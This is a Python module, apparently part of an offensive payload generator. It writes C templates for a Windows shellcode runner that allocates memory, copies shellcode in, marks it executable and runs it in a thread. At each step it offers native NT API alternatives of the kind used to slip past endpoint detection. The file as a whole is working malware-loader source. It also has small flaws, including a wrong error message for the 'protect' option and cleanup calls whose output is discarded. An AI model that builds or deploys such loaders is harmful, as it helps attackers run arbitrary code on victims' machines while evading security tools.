from string import Template
from c.utils.functions import *

class shellcoderunner:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'

        self.allocate = 'VirtualAlloc'
        if 'allocate' in arguments:
            if arguments['allocate'] in ['VirtualAlloc', 'HeapAlloc', 'VirtualAllocEx', 'NtAllocateVirtualMemory']:
                self.allocate = arguments['allocate']
            else:
                print('Allocate argument must be VirtualAlloc, VirtualAllocEx, HeapAlloc, or NtAllocateVirtualMemory')
                exit(0)

        self.execute = 'CreateThread'
        if 'execute' in arguments:
            if arguments['execute'] in ['CreateThread', 'NtCreateThreadEx']:
                self.execute = arguments['execute']
            else:
                print('Execute argument must be CreateThread or NtCreateThreadEx')
                exit(0)

        self.copy = 'memcpy'
        if 'copy' in arguments:
            if arguments['copy'] in ['memcpy', 'NtWriteVirtualMemory', 'WriteProcessMemory']:
                self.copy = arguments['copy']
            else:
                print('Copy argument must be memcpy, WriteProcessMemory, or NtWriteVirtualMemory')
                exit(0)

        self.protect = 'VirtualProtect'
        if 'protect' in arguments:
            if arguments['protect'] in ['VirtualProtect', 'NtProtectVirtualMemory']:
                self.protect = arguments['protect']
            else:
                print('Protect argument must be WaitForSingleObject or NtWaitForSingleObject')
                exit(0)

        self.wait = 'WaitForSingleObject'
        if 'wait' in arguments:
            if arguments['wait'] in ['WaitForSingleObject', 'NtWaitForSingleObject']:
                self.wait = arguments['wait']
            else:
                print('Wait argument must be WaitForSingleObject or NtWaitForSingleObject')
                exit(0)

        self.close = 'CloseHandle'
        if 'close' in arguments:
            if arguments['close'] in ['CloseHandle', 'NtClose']:
                self.close = arguments['close']
            else:
                print('Close argument must be CloseHandle, or NtClose')
                exit(0)



    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>",
                '#include "spawnandinject.h"']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        template = '{transformers}'

        if self.allocate == 'VirtualAlloc':
            template += VirtualAlloc('buffer', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')
        elif self.allocate == 'HeapAlloc':
            template += HeapAlloc('buffer', 'HEAP_ZERO_MEMORY', '{shellcodeSize}')
        elif self.allocate == 'NtAllocateVirtualMemory':
            template += NtAllocateVirtualMemory('buffer', '(HANDLE)-1', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')
        elif self.allocate == 'VirtualAllocEx':
            template += VirtualAllocEx('buffer', '(HANDLE)-1', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')

        if self.copy == 'memcpy':
            template += memcpy('buffer', 'shellcode', '{shellcodeSize}')
        elif self.copy == 'NtWriteVirtualMemory':
            template += NtWriteVirtualMemory('(HANDLE)-1', 'buffer', 'shellcode', '{shellcodeSize}')
        elif self.copy == 'WriteProcessMemory':
            template += WriteProcessMemory('(HANDLE)-1', 'buffer', 'shellcode', '{shellcodeSize}')

        if self.protect == 'VirtualProtect':
            template += VirtualProtect('buffer', '{shellcodeSize}', self.memoryPermission)
        elif self.protect == 'NtProtectVirtualMemory':
            template += NtProtectVirtualMemory('(HANDLE)-1', 'buffer', '{shellcodeSize}', self.memoryPermission)

        if self.execute == 'CreateThread':
            template += CreateThread('hThread', 'buffer')
        elif self.execute == 'NtCreateThreadEx':
            template += NtCreateThreadEx('hThread', '(HANDLE)-1', 'buffer')

        if self.wait == 'WaitForSingleObject':
            template += WaitForSingleObject('hThread', 'INFINITE')
        elif self.wait == 'NtWaitForSingleObject':
            template += NtWaitForSingleObject('hThread', 'INFINITE')

        if self.close == 'CloseHandle':
            template += CloseHandle('hThread')
        elif self.close == 'NtClose':
            template += NtClose('hThread')

        if self.allocate == 'VirtualAlloc':
            VirtualFree('buffer')
        elif self.allocate == 'HeapAlloc':
            HeapFree('hHeap', 'buffer')
        elif self.allocate == 'NtAllocateVirtualMemory':
            NtFreeVirtualMemory('(HANDLE)-1', 'buffer')

        return template